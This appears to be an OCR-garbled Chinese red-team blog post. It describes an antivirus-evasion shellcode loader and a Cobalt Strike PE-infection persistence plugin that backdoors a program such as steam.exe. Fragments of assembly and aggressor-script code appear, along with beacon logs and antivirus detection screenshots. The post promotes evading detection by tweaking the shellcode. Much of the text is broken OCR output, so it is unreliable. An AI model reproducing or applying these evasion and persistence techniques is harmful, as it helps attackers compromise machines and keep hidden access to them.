花了⼀天时间学习WPF图形化开发,C#的图形化我没学过.原始Form实在是丑.
最后完成如下.
加密⽤的RSA.
沙盒判断也很简单,星球⾥⾯发了很多次了.(原来那个)
物理机测试免杀360(主机到了,快乐)
然后想起来看到了⼀个pe感染权限维持的项⽬,趁着⼼情好复现⼀下.
我加到了⾃⼰改的Kit⾥⾯
前⾔
⼝
流沙免杀加载器
RedTeamWing
加密⽅式
加载⽅式
图标
临时⽂件
语⾔
CPU
沙盒烧过
Sleep
Disk
UAC
Mac
进程注⼊
explore.exe
后续
msinLasm-Peiniect-dii
peinject.cpp
Welcome
main.cpp
EXPLORER
main.asm
peinject.cna
shellexecute
OPENEDITORS
main.asm
PEINJECTDLL
push
push.o
这⾥要修改偏移
81
pushoffsetpath
cs-peinject
nO
这⾥要修改偏移
82
pushoffsetmethod
中
images
push
peiniect
calL.dwordptrss:[esp+18h]
Peinjectdil
addesp,38h
main.cpp
填⼊旧的⼊⼝点
86
jimpmain
Peinjecuall.vcxproj
methoddb'"open".
Peinjectdll.vcxprojfilters
pathdb"c:usersisunmnDesKOpITTHexEdi.xe"
shellcode调试
89
nop
shellexecute
90
nop
nop
mantasm
nop
shellexecutevcxproj
93
mainendp
shellexecuteycxproj.filters
94
endmain
gitattributes
95
gitignore
Peinjcctdll.sln
README.md
TIMELINE
Ln95.Col1
master
要注意⼏个问题.
RIkYIewAttacksReportingHelp
0图三⽇
internal
11stener
external
1as
pid
computer
rch
process
192.168.123.77
2h
DESKTOP-9IPJBEB
192.168.123.77
http-1ocal
7256
192.168.123.77
192.168.123.77
DESKTOP-9IPJBEE
http-1ocal
18784
ArRexe
DESKTOP-9IPJBEG
192:16⽇123.77
http-1ocal
192.16⽇.123.77
18588
Interact
DECVTOAATAIREA
192.168.123.77
192.168.123.77
64
37872
http-1ocal
In1T101ACCEBS
Wingkit
53046
192.168.123.77
192.1686.123.77
arRe
11m
Access
⾃启动
PE成染
史克染的⽂件路径
Explore
注在表
Peinject
Pivoting
张向移动
不捉仅
Spawn
riviiege
Hisc
Session
redentinl
Set/updateDefaults
beacon192.168123.7年18588
BEacSHarpTaskT1853
EventLog
FILe192168.14
Scripts
ScriptConso1e
thePpl
PTaskcdBcacontofindswchostoxningusAandmalkeittho
[waskedbeacontobecomentaractlve
[阳Inncttoflapath:PmgrmFles(Stem.
Taskedbeacontohject/ser/ying/Redtemw/mktncu
Waitingafewseccndsforpeinjectconplete...
⽔perstensepenjectccmelete
Thostcallodhcme,sant76271bytos
FutLrpoSTCbEWbESPAYncDtHFakOPPIDOT
NTALTHORISYSTEM
SchoteNc2o9
Taskedbercontospoof960amoontmocos
Tt@becontomtucheh
hostcalledhame,sent12
ppd960kinadiftarentdesktos(pdm
hastcalledhcme,sent260624bytes
特别是script_recource不能错.
然后设置好路径
我是⽤的steam.直接执⾏,steam打开就会上线.
item"Peinject"
local('shrfilehafilehfilesbid$)
foreach$bid($1)
blog($bid,Einjcttofileth:$filepath"
$hrfile
ppenf(eliwin_cs4third-partyPeinjectinjc
bin");
$buf:readb(shrfile,-):closef(hfile);
$hafilecopen
(">>E:WWIn_C54l1thirdpartyPeinjectpeinjc.
writeb(shafile,$filepath):close(hfie)
$curr_pidbeaconinfo(bid,"i)
bshinject(bid,i,
peinject.
script_resource
bin"));
"waitingafewsecondsforpeinjectcomplee."
blog($bid,
bpause($bid,1000);
cS4\\thirdpartyiPeinjectipeinjc
$hfile
opentCE:IWi
bin");
$buf):closef(shfile);
writeb(shfile,
blog(sbid,
"persistence-peinjectcomplete");
shellcode被查到了,但是没关系,⾃⼰改下就免杀了.
我的加载器也不是很好,但是先留着⽤⼀阵⼦,这不HW快开始了.233333
商店
最强⾼达之战
泌战2休闲玩
单机
⼤型⽹游
误报反馈
⼤脑提翻态
发现⽊⻢,建议⽴即清除
⽊⻢⽂件:
C:ProgramFiles(x86Steamlsteamexe
⽊⻢名称:HEUR/QVM19.1.941C.MalwareGe
有⽊⻢试图攻击您的电脑,360已成功栏截.
I
极智守护
添加信任
⽴即清除并全⾯扫描
源⾃360安全⼤脑
"本地磁盘(D:
Unix(L
⽉